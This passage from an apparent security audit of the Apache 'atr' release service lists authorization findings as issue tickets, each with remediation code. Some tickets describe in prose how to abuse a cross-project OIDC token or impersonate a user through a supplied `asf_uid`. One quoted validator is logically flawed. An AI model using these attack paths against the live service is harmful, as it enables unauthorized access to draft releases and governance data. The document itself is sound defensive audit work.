- `atr/get/distribution.py:205` - `stage_record_selected()` - POST with storage-layer mitigation

The GET endpoint `list_get()` is particularly concerning as it:
- Returns full distribution records for any project
- Exposes workflow task details including status and arguments
- Has no storage-layer authorization mitigation
- Uses underscore-prefixed `_session` parameter (non-standard)

The POST handlers have storage-layer authorization via `write_as_committee_member()`, but lack defense-in-depth at the endpoint level.

### Recommended Remediation
Add `await session.check_access(project_key)` at the beginning of all four functions:

```python
# In atr/get/distribution.py

async def list_get(project_key: str, session: web.Committer):  # Remove underscore prefix
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    distributions = await data.get_distributions(project_key)
    # ... rest of handler ...

# Apply same pattern to record_selected(), stage_automate_selected(), stage_record_selected()
```

### Acceptance Criteria
- [ ] All four distribution endpoints enforce project-level authorization
- [ ] `list_get()` parameter renamed from `_session` to `session`
- [ ] Unauthorized committers cannot access other projects' distribution data
- [ ] POST handlers maintain defense-in-depth despite storage-layer authorization
- [ ] Integration tests verify authorization enforcement

### References
- Source reports: L1:8.2.2.md
- Related findings: None
- ASVS sections: 8.2.2

### Priority
Medium

---

## Issue: FINDING-249 - Missing Project Binding in Distribution Task Status Update (BOLA)

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The distribution task status update endpoint validates GitHub OIDC JWT signatures but does not bind the JWT's repository to the target project. An attacker with a valid GitHub Actions OIDC token from any Apache repository can update workflow status for any project by supplying arbitrary `project_key`, `workflow_id`, and `run_id` parameters. This is a Broken Object Level Authorization (BOLA) vulnerability that allows cross-project workflow manipulation.

### Details
In `atr/api/__init__.py` at line 670, the distribution task status endpoint:
1. Validates GitHub OIDC JWT signature (authentication ✓)
2. Accepts user-supplied `project_key` parameter (no validation ✗)
3. Does NOT verify JWT's repository matches the project

An attacker with GitHub Actions access to any Apache repository (e.g., `apache/commons-lang`) could:
1. Generate valid OIDC token from their repository's workflow
2. Call the status update endpoint with another project's `project_key` (e.g., `apache/kafka`)
3. Update workflow status for the victim project
4. Mark distributions as complete without actually executing workflows

This allows:
- Cross-project workflow status manipulation
- Bypassing distribution validation workflows
- False reporting of distribution completion

### Recommended Remediation
Extract repository name from JWT payload and verify it matches the target project:

```python
# In atr/api/__init__.py, distribution task status endpoint
async def update_distribution_status(args: DistributionStatusArgs):
    # Validate GitHub OIDC JWT
    payload = validate_github_oidc_jwt(args.token)
    
    # Extract repository from JWT claims
    jwt_repository = payload.get('repository')  # e.g., "apache/kafka"
    
    # Look up release policy for the target project
    policy = await data.get_release_policy(args.project_key)
    
    # Verify JWT repository matches policy's configured repository
    if policy.github_repository_name != jwt_repository:
        raise Forbidden(
            f"JWT repository '{jwt_repository}' does not match "
            f"project '{args.project_key}' repository '{policy.github_repository_name}'"
        )
    
    # Proceed with status update
    await data.update_workflow_status(args.workflow_id, args.run_id, args.status)
```

### Acceptance Criteria
- [ ] JWT repository is extracted from OIDC payload
- [ ] Repository is verified against project's configured repository
- [ ] Cross-project status updates are prevented
- [ ] Error message clearly indicates repository mismatch
- [ ] Integration test verifies cross-project prevention

### References
- Source reports: L1:8.2.2.md
- Related findings: None
- ASVS sections: 8.2.2

### Priority
Medium

---

## Issue: FINDING-250 - Missing Authorization on Revision Check Data Endpoint

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The revision-level check data endpoint returns check summaries, file listings, and delete forms for any project's releases (including drafts) without verifying project-level authorization. The endpoint accepts `project_key`, `version_key`, and `revision_number` parameters but does not call `session.check_access(project_key)` before fetching release data. Any authenticated committer can view detailed check results for releases they shouldn't have access to.

### Details
In `atr/get/checks.py` at line 101, the `selected_revision()` function:
- Accepts `project_key`, `version_key`, `revision_number` parameters
- Fetches release data via `data.release()`
- Returns check summaries, file listings, and delete forms
- Does NOT call `session.check_access(project_key)`

This allows any ASF committer to:
- View check results for other projects' releases
- Access file listings for draft releases
- See check status and failure details
- View security scan results and vulnerability data

### Recommended Remediation
Add `await session.check_access(project_key)` at the beginning of the `selected_revision()` function:

```python
# In atr/get/checks.py, selected_revision() function
async def selected_revision(
    project_key: str,
    version_key: str,
    revision_number: int,
    session: web.Committer
):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await data.release(project_key, version_key)
    # ... rest of handler ...
```

### Acceptance Criteria
- [ ] Revision check endpoint enforces project-level authorization
- [ ] Unauthorized committers cannot access other projects' check data
- [ ] Integration test verifies authorization enforcement
- [ ] No functional regression for authorized users

### References
- Source reports: L1:8.2.2.md
- Related findings: None
- ASVS sections: 8.2.2

### Priority
Medium

---

## Issue: FINDING-251 - Missing Authorization on File Report Endpoint

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The file report endpoint returns detailed check results for individual files without verifying project-level authorization. The endpoint renders an HTML report showing check status, messages, and ignored checks for any file in any project (including draft releases). Any authenticated committer can access detailed file-level security analysis for projects they don't have access to.

### Details
In `atr/get/report.py` at line 36, the `selected_path()` function:
- Accepts `project_key`, `version_key`, and `path` parameters
- Fetches release via `session.release()`
- Returns detailed check results including status and messages
- Does NOT call `session.check_access(project_key)`

This allows any ASF committer to:
- View file-level check results for other projects
- Access security scan details for individual files
- See check messages and ignored check rationales
- Enumerate file paths in other projects' releases

### Recommended Remediation
Add `await session.check_access(project_key)` at the beginning of the `selected_path()` function:

```python
# In atr/get/report.py, selected_path() function
async def selected_path(
    project_key: str,
    version_key: str,
    path: str,
    session: web.Committer
):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...
```

### Acceptance Criteria
- [ ] File report endpoint enforces project-level authorization
- [ ] Unauthorized committers cannot access other projects' file reports
- [ ] Integration test verifies authorization enforcement
- [ ] No functional regression for authorized users

### References
- Source reports: L1:8.2.2.md
- Related findings: ASVS-822-HIGH-002
- ASVS sections: 8.2.2

### Priority
Medium

---

## Issue: FINDING-252 - Admin KEYS Regeneration Uses Incorrect Authorization Level

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The admin KEYS file regeneration endpoint uses `write.as_committee_member()` instead of `write.as_committee_admin()`, causing the operation to silently skip committees where the admin is not a PMC member. This results in incomplete KEYS file regeneration when an admin (who should have authority over all committees) is not a member of specific committees. The operation completes with success message but silently fails for some committees.

### Details
In `atr/admin/__init__.py` at line 392, the `keys_regenerate_all_post()` function uses:
```python
write = await data.write.as_committee_member_outcome(committee_key)
```

This should use:
```python
write = await data.write.as_committee_admin_outcome(committee_key)
```

The current implementation:
- Requires admin to be a member of each committee
- Silently skips committees where admin is not a member
- Provides incomplete KEYS regeneration
- Shows success message despite partial failure

Admins should have authority over all committees regardless of membership, which is the purpose of the `as_committee_admin()` method.

### Recommended Remediation
Replace `write.as_committee_member_outcome()` with `write.as_committee_admin_outcome()`:

```python
# In atr/admin/__init__.py, keys_regenerate_all_post() function
async def keys_regenerate_all_post():
    results = []
    for committee_key in all_committees:
        # Use admin-level authorization
        write = await data.write.as_committee_admin_outcome(committee_key)
        
        if write.success:
            await write.regenerate_keys_file()
            results.append(f"✓ {committee_key}")
        else:
            results.append(f"✗ {committee_key}: {write.error}")
    
    # Return detailed status
    return template.render('admin/keys-regenerate-results.html',
                          results=results)
```

Add detailed status reporting to indicate which committees were successfully regenerated and which failed with reasons.

### Acceptance Criteria
- [ ] Admin KEYS regeneration uses `as_committee_admin()` authorization
- [ ] All committees are regenerated regardless of admin's membership
- [ ] Status report shows success/failure for each committee
- [ ] Error messages explain any failures
- [ ] Unit test verifies admin authority over all committees

### References
- Source reports: L1:8.2.2.md
- Related findings: None
- ASVS sections: 8.2.2

### Priority
Medium

---

## Issue: FINDING-253 - File Content Accessible Without Project Authorization

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The file viewing endpoints (`/get/file/{project}/{version}` and `/get/file/{project}/{version}/{path}`) retrieve release files without validating that the authenticated user has access to the project. While authentication is enforced via `@auth.require`, project-level authorization is bypassed. Any authenticated committer can read files from any project's releases, including draft releases that should be restricted to project participants.

### Details
In `atr/get/file.py`:
- Lines 30-102: File listing endpoint
- Lines 105-169: File content endpoint

Both endpoints:
- Require authentication (`web.Committer` session)
- Fetch release data via `session.release()`
- Do NOT call `session.check_access(project_key)`

This allows any ASF committer to:
- View file listings for other projects' releases
- Read file content from draft releases
- Access pre-release artifacts
- Enumerate project files

### Recommended Remediation
Add project authorization check before release retrieval in both functions:

```python
# In atr/get/file.py

# File listing endpoint (line ~30)
async def file_list(project_key: str, version_key: str, session: web.Committer):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...

# File content endpoint (line ~105)
async def file_content(project_key: str, version_key: str, path: str, session: web.Committer):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...
```

### Acceptance Criteria
- [ ] File listing endpoint enforces project-level authorization
- [ ] File content endpoint enforces project-level authorization
- [ ] Unauthorized committers cannot access other projects' files
- [ ] Integration tests verify authorization enforcement
- [ ] No functional regression for authorized users

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-003
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-254 - Resource-Committee Validation Control Exists But Not Applied Across Storage Writers

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `checks.py` writer implements a validation pattern to ensure a project belongs to the committee the user is acting as a member of. This control is not consistently applied across other writer classes (`distributions.py`, `policy.py`, `release.py`, `revision.py`, `sbom.py`), creating potential for cross-committee authorization bypass if future code changes introduce direct committee-level access. This represents a defense-in-depth gap where the validation pattern exists but is not systematically enforced.

### Details
In `atr/storage/writers/checks.py`, the ignore check result method validates:
```python
# Verify project belongs to the committee
if release.committee_key != self.committee_key:
    raise AccessError("Project does not belong to this committee")
```

This pattern is NOT applied in:
- `atr/storage/writers/distributions.py`
- `atr/storage/writers/policy.py`
- `atr/storage/writers/release.py`
- `atr/storage/writers/revision.py`
- `atr/storage/writers/sbom.py`

While no active exploit exists (project-level authorization is enforced at endpoint level), the lack of defense-in-depth creates risk if:
- Future code introduces direct committee-level access
- Endpoint-level authorization is accidentally bypassed
- Code refactoring removes existing protections

### Recommended Remediation
Extract shared validation to base class and apply in all writer methods accepting project/release keys:

```python
# In atr/storage/writers/base.py
class WriteAsCommitteeMember:
    def _validate_project_in_committee(self, release):
        """Validate that project belongs to the committee context."""
        if release.committee_key != self.committee_key:
            raise AccessError(
                f"Project {release.project_key} does not belong to "
                f"committee {self.committee_key}"
            )

# Apply in all writer methods
class DistributionWriter(WriteAsCommitteeMember):
    async def record_distribution(self, project_key: str, ...):
        release = await self._get_release(project_key)
        self._validate_project_in_committee(release)  # ADD
        # ... rest of method ...
```

Apply this validation in all writer classes and methods that accept project or release keys.

### Acceptance Criteria
- [ ] Base class provides shared `_validate_project_in_committee()` method
- [ ] All writer classes validate project-committee binding
- [ ] Validation is applied before privileged operations
- [ ] Unit tests verify cross-committee access is prevented
- [ ] Documentation explains defense-in-depth validation pattern

### References
- Source reports: L1:8.3.1.md
- Related findings: None
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-255 - Missing Project-Level Authorization on Check Report Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The check report and SBOM report viewing endpoints retrieve security analysis results without validating project-level authorization. Any authenticated committer can view check reports and SBOM data (including CVE identifiers, vulnerability severity, dependency licenses) for any project. This exposes sensitive security information about projects the user should not have access to.

### Details
The following endpoints lack project authorization:
- `atr/get/report.py:36` - `selected_path()` - Returns detailed check results
- `atr/get/sbom.py:40` - SBOM endpoint - Returns SBOM with CVE data

Both endpoints:
- Require authentication (`web.Committer` session)
- Fetch release data via `session.release()`
- Do NOT call `session.check_access(project_key)`
- Return security-sensitive information

Exposed data includes:
- Check results and failure messages
- Security vulnerability identifiers (CVEs)
- Vulnerability severity ratings
- Dependency licenses and versions
- SBOM component details

### Recommended Remediation
Add project authorization check before release retrieval in both files:

```python
# In atr/get/report.py
async def selected_path(project_key: str, version_key: str, path: str, session: web.Committer):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...

# In atr/get/sbom.py
async def sbom_view(project_key: str, version_key: str, session: web.Committer):
    # ADD: Project authorization check
    await session.check_access(project_key)
    
    # Existing logic
    release = await session.release(project_key, version_key)
    # ... rest of handler ...
```

### Acceptance Criteria
- [ ] Check report endpoint enforces project-level authorization
- [ ] SBOM endpoint enforces project-level authorization
- [ ] Unauthorized committers cannot access other projects' security data
- [ ] Integration tests verify authorization enforcement
- [ ] No functional regression for authorized users

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-001
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-256 - Storage Layer Bypassed for Revision Tag Modification

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `_set_tag()` function allows modification of revision tags through direct database writes instead of routing through the storage layer. While project access is validated via `session.release()`, the operation bypasses storage layer authorization checks and audit logging. Revision tags can be modified without proper authorization validation or audit trail, violating the storage layer architecture that provides centralized authorization and auditing.

### Details
In `atr/post/revisions.py` (lines 67-95), the `_set_tag()` function:
1. Validates project access via `session.release()` ✓
2. Directly writes to database via `db.session()` ✗
3. Bypasses storage layer authorization ✗
4. No audit logging ✗

This violates the architectural pattern where:
- Storage layer provides authorization (`write.as_committee_member()`)
- Storage layer creates audit log entries
- Direct database access is avoided in handlers

The storage layer architecture exists to:
- Centralize authorization logic
- Provide consistent audit logging
- Enforce business rules
- Prevent authorization bypass

### Recommended Remediation
Route through storage layer with proper authorization:

```python
# In storage layer (atr/storage/writers/revision.py)
class RevisionWriter:
    async def set_tag(self, release_key: str, revision_number: int, tag: str):
        """Set tag for revision with authorization and audit logging."""
        # Storage layer handles authorization check
        release = await self._get_release(release_key)
        
        # Update tag
        revision = await self._get_revision(release_key, revision_number)
        revision.tag = tag
        await self._commit()
        
        # Create audit log entry
        await self._audit_log(
            action='revision_tag_updated',
            release_key=release_key,
            revision_number=revision_number,
            tag=tag
        )

# In handler (atr/post/revisions.py)
async def _set_tag(project_key: str, version_key: str, revision_number: int, tag: str, session: web.Committer):
    await session.check_access(project_key)
    release = await session.release(project_key, version_key)
    
    # Route through storage layer
    write = await data.write.as_committee_member(
        committee_key=release.committee_key,
        asf_uid=session.uid
    )
    await write.set_tag(release.key, revision_number, tag)
```

### Acceptance Criteria
- [ ] Revision tag updates route through storage layer
- [ ] Storage layer validates authorization
- [ ] Tag updates are audit logged
- [ ] Direct database writes are removed from handler
- [ ] Unit test verifies audit logging

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-HIGH-001
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-257 - Vote Duration Not Validated Against Release Policy Minimum

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `start()` function in the vote writer accepts a `vote_duration_choice` parameter without validating it against the release's configured minimum voting period (`ReleasePolicy.min_hours`). This allows committee participants to initiate votes with durations shorter than governance requirements, potentially completing votes in 1 hour when policy requires 72 hours. This violates ASF governance requirements for minimum voting periods.

### Details
In `atr/storage/writers/vote.py` (lines 117-167), the `start()` function:
- Accepts `vote_duration_choice` parameter from user input
- Does NOT validate against `release_policy.min_hours`
- Allows votes shorter than governance requirements

Example violation:
- Release policy requires `min_hours = 72` (3 days)
- User supplies `vote_duration_choice = 1` (1 hour)
- Vote is started with 1-hour duration
- Governance requirement is violated

This undermines ASF governance by allowing:
- Fast-track votes that bypass required review periods
- Non-compliant release approvals
- Potential governance challenges to releases

### Recommended Remediation
Add validation against release policy minimum:

```python
# In atr/storage/writers/vote.py, start() function
async def start(self, release_key: str, vote_duration_choice: int):
    """Start vote with validation against policy minimum."""
    release = await self._get_release(release_key)
    policy = await self._get_release_policy(release.policy_id)
    
    # Validate against policy minimum
    if vote_duration_choice < policy.min_hours:
        raise storage.AccessError(
            f"Vote duration {vote_duration_choice} hours is less than "
            f"policy minimum {policy.min_hours} hours"
        )
    
    # Proceed with vote creation
    # ... rest of method ...
```

### Acceptance Criteria
- [ ] Vote duration is validated against policy minimum
- [ ] Short-duration votes are prevented with clear error message
- [ ] Error message indicates policy minimum requirement
- [ ] Unit test verifies validation enforcement
- [ ] Integration test attempts to create short-duration vote

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-006
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-258 - API Model Lacks Input Validation Present in Web Form

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The web form for updating vote policy includes a Pydantic validator ensuring `min_hours` is either 0 or between 72-144 hours. The corresponding API model (`PolicyUpdateArgs`) lacks this validation, allowing JWT-authenticated users to bypass constraints via API requests and set invalid policy values like 1-hour minimum voting periods. This creates an authorization bypass through API that is prevented in the web UI.

### Details
In `atr/models/api.py` (lines 220-244), the `PolicyUpdateArgs` model lacks validation that exists in the web form:

Web form validation (present):
```python
class VotePolicyForm:
    @model_validator(mode='after')
    def validate_min_hours(self):
        if self.min_hours not in (0, range(72, 145)):
            raise ValueError("min_hours must be 0 or 72-144")
        return self
```

API model validation (absent):
```python
class PolicyUpdateArgs(BaseModel):
    min_hours: int  # No validation
```

This allows API users to:
- Set `min_hours = 1` (governance violation)
- Bypass 72-hour minimum voting period
- Create non-compliant release policies
- Circumvent web form validation

### Recommended Remediation
Add identical Pydantic `model_validator` to `PolicyUpdateArgs` matching the web form validation:

```python
# In atr/models/api.py
from pydantic import model_validator

class PolicyUpdateArgs(BaseModel):
    min_hours: Optional[int] = None
    # ... other fields ...
    
    @model_validator(mode='after')
    def validate_min_hours(self):
        """Validate min_hours is 0 or 72-144 (matching web form validation)."""
        if self.min_hours is not None:
            if self.min_hours != 0 and not (72 <= self.min_hours <= 144):
                raise ValueError(
                    "min_hours must be 0 (no voting) or 72-144 hours "
                    "(minimum 3 days per ASF governance requirements)"
                )
        return self
```

### Acceptance Criteria
- [ ] API model enforces same `min_hours` validation as web form
- [ ] Invalid `min_hours` values are rejected with clear error
- [ ] API and web form validation are consistent
- [ ] Unit test verifies API validation enforcement
- [ ] Integration test attempts to set invalid `min_hours` via API

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-005
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-259 - API Models Accept Client-Submitted Identity Alongside JWT

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Two API models (`DistributeSshRegisterArgs` and `DistributionRecordFromWorkflowArgs`) accept both a JWT token (which contains authenticated identity) and a separate `asf_uid` parameter (client-submitted identity). If handlers use the client-submitted `asf_uid` for authorization decisions or audit logging instead of the JWT-derived identity, attackers could impersonate other users by supplying arbitrary `asf_uid` values while using their own valid JWT.

### Details
In `atr/models/api.py`:
- Lines 69-88: `DistributeSshRegisterArgs` includes both `token` and `asf_uid`
- Lines 113-140: `DistributionRecordFromWorkflowArgs` includes both `token` and `asf_uid`

This creates risk where:
- JWT contains authenticated identity (e.g., `user123`)
- Request includes `asf_uid=admin456`
- If handler uses `asf_uid` for authorization or logging, impersonation occurs

Attack scenario:
1. Attacker generates valid JWT for their account
2. Submits API request with their JWT
3. Includes `asf_uid=victim_user` in request body
4. If handler uses `asf_uid` instead of JWT subject, operations execute as victim

### Recommended Remediation
**Option A (Recommended):** Remove redundant `asf_uid` field from API models:

```python
# In atr/models/api.py
class DistributeSshRegisterArgs(BaseModel):
    token: str  # JWT contains identity in 'sub' claim
    # REMOVE: asf_uid: str
    project_key: str
    # ... other fields ...

# Handler extracts identity from JWT
async def register_ssh_handler(args: DistributeSshRegisterArgs):
    payload = jwtoken.verify(args.token)
    asf_uid = payload['sub']  # Use JWT identity
    # ... proceed with asf_uid from JWT ...
```

**Option B:** Add Pydantic `model_validator` that enforces `asf_uid` matches JWT subject:

```python
class DistributeSshRegisterArgs(BaseModel):
    token: str
    asf_uid: str
    # ... other fields ...
    
    @model_validator(mode='after')
    def validate_uid_matches_token(self):
        """Verify asf_uid matches JWT subject claim."""
        payload = jwtoken.verify(self.token)
        if payload['sub'] != self.asf_uid:
            raise ValueError("asf_uid does not match JWT subject")
        return self
```

### Acceptance Criteria
- [ ] Identity is derived exclusively from JWT or validated against JWT
- [ ] Client cannot supply arbitrary `asf_uid` for impersonation
- [ ] All API handlers use JWT-derived identity
- [ ] Unit test verifies identity extraction from JWT
- [ ] Integration test attempts identity manipulation

### References
- Source reports: L1:8.3.1.md
- Related findings: None
- ASVS sections: 8.3.1

### Priority
Medium

---

## Issue: FINDING-260 - Authorization Documentation Lacks Field-Level Write Access Restrictions

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Authorization documentation defines operation-level access (who can start releases, resolve votes, etc.) but does not specify which fields of each entity each role can write, or how field access changes based on resource state. ASVS 8.1.2 explicitly requires documentation of 'field-level access restrictions (both read and write) based on consumer permissions and resource attributes.' Undocumented field-level rules exist in code but are not captured in documentation, making security verification and developer onboarding difficult.

### Details
Documentation in `atr/docs/authorization-security.md` states broad rules like "Upload release artifacts: Allowed for: Project participants" but does not document WHICH FIELDS they can modify.

Undocumented field-level write rules include:
- `Release.phase` - Only via state transitions, not direct writes
- `Release.vote_resolved` - PMC members only, RELEASE_CANDIDATE phase only
- `ReleasePolicy.manual_vote` - PMC members; disallowed for podlings
- `ReleasePolicy.min_hours` - PMC members; must be 0 or 72-144
- `CheckResultIgnore.*` - PMC members with pattern validation
- Others scattered across storage writers

These rules exist in code across:
- `atr/storage/writers/release.py`
- `atr/storage/writers/policy.py`
- `atr/storage/writers/checks.py` (lines 87-130)
- `atr/storage/writers/keys.py`
- `atr/storage/writers/distributions.py`

### Recommended Remediation
Add field-level access matrix to `authorization-security.md` documenting:

1. **Release Entity Fields**
   - `phase`: Writable via state transitions only; requires participant + preconditions
   - `vote_resolved`: PMC members only in CANDIDATE phase
   - `vote_started`: PMC members only; triggers vote creation
   - `artifacts`: Project participants in DRAFT phase

2. **ReleasePolicy Entity Fields**
   - `manual_vote`: PMC members only; false for podlings
   - `min_hours`: PMC members; 0 or 72-144 range
   - `github_repository_name`: PMC members; validated format
   - `workflow_paths`: PMC members; validated paths

3. **CheckResultIgnore Entity Fields**
   - `pattern`: PMC members; validated regex
   - `reason`: PMC members; required non-empty
   - Ownership transfer behavior documented

4. **PublicSigningKey Entity Fields**
   - `committee_associations`: Committee participants only
   - `fingerprint`: Immutable after creation

Include verification steps:
- Create field-level access matrix document
- Review all storage writer methods to extract field rules
- Document ownership transfer behaviors
- Document immutable fields
- Cross-reference with operation-level documentation
- Add to security review checklist

### Acceptance Criteria
- [ ] Field-level write access matrix is documented for all entities
- [ ] Documentation specifies which roles can write which fields
- [ ] State-dependent field access is documented
- [ ] Immutable fields are clearly identified
- [ ] Documentation matches implemented behavior

### References
- Source reports: L2:8.1.2.md
- Related findings: ASVS-812-MED-003
- ASVS sections: 8.1.2

### Priority
Medium

---

## Issue: FINDING-261 - Authorization Documentation Lacks Field-Level Read Access Restrictions

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Documentation states 'View release information: Allowed for: Everyone' but does not specify which fields are exposed to unauthenticated vs. authenticated users. ASVS 8.1.2 requires documentation of field-level access restrictions for both read and write operations. Code implements different reader classes (`ReadAsGeneralPublic`, `ReadAsFoundationCommitter`) suggesting differentiated read access exists but is not documented, making it impossible to verify correct implementation or detect field-level information disclosure.

### Details
Undocumented field-level read restrictions include:
- `PersonalAccessToken.token_hash` - Never returned to any user
- `PersonalAccessToken.token_id/name/created` - Owner only
- `Release.votes` - Access level not specified
- `Committee.committee_members` - Public via API
- `WorkflowStatus.task_args` - Public; may contain email addresses
- SSH key fingerprints - Public in API

Storage layer implements reader hierarchy in `atr/storage/__init__.py` (lines 69-85):
- `ReadAsGeneralPublic` - Base reader
- `ReadAsFoundationCommitter` - Extended reader

But documentation does not explain:
- Which fields each reader class exposes
- Why certain fields are public
- Rationale for field-level access decisions
- Privacy implications of public fields

### Recommended Remediation
Document field-level read access matrix in `authorization-security.md`:

1. **Release Files Access**
   - Public in all phases (draft, candidate, preview, release)
   - Rationale: Enables pre-vote verification by community

2. **Personal Access Tokens Fields**
   - `token_hash`: Never exposed
   - `token_id`, `name`, `created`: Owner only
   - Rationale: Token metadata is authentication-related

3. **Committee Data Fields**
   - `committee_name`, `committee_members`, `type`: Public
   - Rationale: ASF governance transparency

4. **Workflow Status Fields**
   - `task_args`: Public (may contain email addresses)
   - Privacy consideration: Email addresses in task arguments
   - Recommendation: Sanitize email addresses before storage

Add verification steps:
- Audit all `ReadAs*` classes to extract field-level access
- Document intentional public access with rationale
- Document sensitive fields never exposed
- Add privacy impact assessment for publicly readable fields
- Create checklist for new fields

### Acceptance Criteria
- [ ] Field-level read access matrix is documented
- [ ] Documentation specifies which fields are public vs. authenticated-only
- [ ] Rationale is provided for public field exposure
- [ ] Privacy implications are documented
- [ ] Reader class behavior matches documentation

### References
- Source reports: L2:8.1.2.md
- Related findings: None
- ASVS sections: 8.1.2

### Priority
Medium

---

## Issue: FINDING-262 - State-Dependent Access Rules Not Systematically Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
The Release entity has four phases (RELEASE_CANDIDATE_DRAFT, RELEASE_CANDIDATE, RELEASE_PREVIEW, RELEASE) that fundamentally change permitted operations and field modifications. ASVS 8.1.2 explicitly requires documentation of rules that 'depend on other attribute values of the relevant data object, such as state or status.' While some phase-dependent rules are documented at operation level, systematic field-level state-dependent rules are not documented, making it impossible to verify state-based authorization correctness.

### Details
Undocumented state-dependent rules include:
- **Phase transition requirements**
  - DRAFT→CANDIDATE: No blocker checks, has files, no ongoing tasks
  - CANDIDATE→PREVIEW: Vote resolved successfully
  - PREVIEW→RELEASE: Distribution recorded

- **SSH access by phase**
  - Write: Only in DRAFT phase
  - Read: DRAFT, CANDIDATE, PREVIEW phases

- **Distribution requirements**
  - PREVIEW→RELEASE transition requires distribution

- **Vote resolution**
  - Only in CANDIDATE phase

These rules are scattered across:
- `atr/storage/writers/announce.py` (lines 83-84)
- `atr/ssh.py` (lines 283-323)
- `atr/storage/writers/release.py` (lines 180-220)
- `atr/storage/writers/vote.py` (lines 45-60)

### Recommended Remediation
Add state machine documentation to `authorization-security.md`:

1. **State Transitions Table**
   | Current Phase | Allowed Transition | Required Role | Additional Conditions |
   |--------------|-------------------|---------------|---------------------|
   | DRAFT | → CANDIDATE | Participant | No blocker checks, has files |
   | CANDIDATE | → PREVIEW | PMC Member | Vote resolved, approved |
   | PREVIEW | → RELEASE | PMC Member | Distribution recorded |

2. **Field Access by Phase Matrix**
   | Field | DRAFT | CANDIDATE | PREVIEW | RELEASE |
   |-------|-------|-----------|---------|---------|
   | artifacts | Write | Read | Read | Read |
   | vote_started | No | Write (once) | No | No |
   | distribution | No | No | Write | Read |

3. **Operation Availability by Phase**
   - Upload artifacts: DRAFT only
   - Start vote: CANDIDATE only
   - Record distribution: PREVIEW only
   - Announce release: RELEASE only

4. **SSH/Rsync Access by Phase**
   | Operation | DRAFT | CANDIDATE | PREVIEW | RELEASE |
   |-----------|-------|-----------|---------|---------|
   | SSH Write | ✓ | ✗ | ✗ | ✗ |
   | SSH Read | ✓ | ✓ | ✓ | ✗ |
   | Public Download | ✗ | ✓ | ✓ | ✓ |

5. **Distribution State Requirements**
   - PREVIEW phase: Distribution must be recorded before RELEASE transition

Add verification steps:
- Create state machine diagram showing all phases and transitions
- Document preconditions for each transition
- Create field access matrix by phase
- Document operation availability by phase
- Add state machine tests to verify documented behavior
- Include state machine in developer onboarding documentation

### Acceptance Criteria
- [ ] State machine is fully documented with phases and transitions
- [ ] Preconditions for each transition are documented
- [ ] Field access by phase is documented
- [ ] Operation availability by phase is documented
- [ ] Documentation matches implemented behavior

### References
- Source reports: L2:8.1.2.md
- Related findings: ASVS-812-MED-001
- ASVS sections: 8.1.2

### Priority
Medium

---

## Issue: FINDING-263 - Public API Endpoints Expose Internal Implementation Fields

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** [L2-only]

**Description:**

### Summary
Public API endpoints return full SQL model objects without field-level filtering, exposing internal implementation details to unauthenticated consumers. This violates BOPLA (Broken Object Property Level Authorization) principles by providing access to object properties that should be internal-only. Affected endpoints include `/tasks/list`, `/checks/list`, `/releases/list`, `/ssh-keys/list`, exposing fields like `pid`, `task_args`, `error`, internal database IDs, cache keys, and other implementation details.

### Details
In `atr/api/__init__.py`:
- Line 783: `/tasks/list` returns full `Task` objects
- Line 1026: `/checks/list` returns full `CheckResult` objects

Exposed internal fields include:
- `pid` - Process ID (internal)
- `task_args` - Internal task arguments
- `error` - Full error messages with stack traces
- `result` - Internal result data
- `asf_uid` - Internal user identifiers
- `data` - Internal check data structures
- `inputs_hash` - Internal cache keys
- `checker_version` - Internal versioning
- `cached` - Internal cache status
- `check_cache_key` - Internal cache keys
- `release_policy_id` - Internal database IDs
- `vote_manual` - Internal policy flags
- `github_payload` - Internal webhook data
- `github_nid`/`github_uid` - Internal GitHub identifiers

These fields reveal:
